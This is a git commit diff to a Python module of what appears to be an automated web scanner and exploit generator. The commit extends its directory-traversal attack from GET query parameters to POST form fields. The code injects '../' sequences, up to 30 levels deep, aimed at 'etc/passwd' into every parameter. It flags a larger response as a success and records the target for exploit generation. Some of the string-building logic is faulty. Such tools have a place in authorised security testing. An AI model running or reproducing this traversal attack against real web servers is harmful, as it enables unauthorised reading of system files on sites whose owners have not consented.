0dd8d83988c990a135a63b2c1ef059868a1b198f
sihao <sihao.box@gmail.com>
2018-04-20 15:39:03 +0800

    Adding directory traversal for post params (embedded)

--- tools/directory_traversal.py
+++ tools/directory_traversal.py
@@ -4,7 +4,7 @@ from generator import ExploitGenerator
 import httplib2, urllib, urllib2
 from BeautifulSoup import BeautifulSoup, SoupStrainer
 from urlparse import urljoin, urlparse
-from helper import has_form, parse_form, post_request, create_get_params
+from helper import has_form, parse_form, post_request, create_get_params, create_post_params
 from sets import Set
 
 EXPLOIT_PATH = "exploits/"
@@ -47,22 +47,26 @@ class DTModule:
         return result
 
     def prepare_params(self, extracted, depth, file):
-        path = "./"
         params = self.retrieve_params(extracted)
+        paths = self.prepare_paths(depth, file)
 
         results = []
-        # go 10 depths into the traversal
+        combined = ""
+        for path in paths:
+            for y in params:
+                combined = y + "=" + path + "&"
+            results.append(combined.rstrip("&"))
+        return results
+
+    def prepare_paths(self, depth, file):
+        path = "./"
+        paths = []
         for x in range(1, depth):
             path += "../" 
             test = path + file
+            paths.append(test)
+        return paths
 
-            # join all params together
-            combined = ""
-            for y in params:
-                combined = y + "=" + test + "&"
-            results.append(combined.rstrip("&"))
-
-        return results
 
     def in_cache(self, cache, string):
         result = False
@@ -83,21 +87,36 @@ class DTModule:
 
             # handle scan for get params
             if parsed.query:
-                #print("testing page: " + web_page)
-                payloads = self.prepare_params(parsed.query, 100, "etc/passwd")
+                # print("testing page: " + web_page)
+                payloads = self.prepare_params(parsed.query, 30, "etc/passwd")
                 
                 for payload in payloads:
                     url = parsed.scheme + "://" + parsed.hostname + parsed.path + "?" + payload
                     new_status, new_response = http.request(url)
 
-                    if new_status.status == 200 and int(new_status['content-length']) > int(status['content-length']):
-                        #print("vulnerable url: " + url + "\n")
-                        if not self.in_cache(cache, url):
-                            results.append((urlparse(url).path, create_get_params(url), "GET"))
-                            cache.append(url)
-                            break  
+                    if new_status.status == 200:
+                        if int(new_status['content-length']) > int(status['content-length']):
+                            # print("vulnerable url: " + url + "\n")
+                            if not self.in_cache(cache, url):
+                                results.append((urlparse(url).path, create_get_params(url), "GET"))
+                                cache.append(url)
+                                break  
+                            break
+
+            # handle scan for post php forms
+            if has_form(response):
+                forms = parse_form(response)
+                original_response = post_request(web_page, forms)
+                injection_forms = []
+                paths = self.prepare_paths(30, "etc/passwd")
+
+                for path in paths:
+                    for form_input in forms:
+                        injection_forms.append((form_input[0], path))
+
+                    new_response = post_request(web_page, injection_forms)
+                    if len(new_response) > len(original_response): # That means that the webpage is different, possibly a successful case
+                        results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
                         break
-
-
-                        
+          
         self.logs = self.log_results(results, EXPLOIT_CLASS)
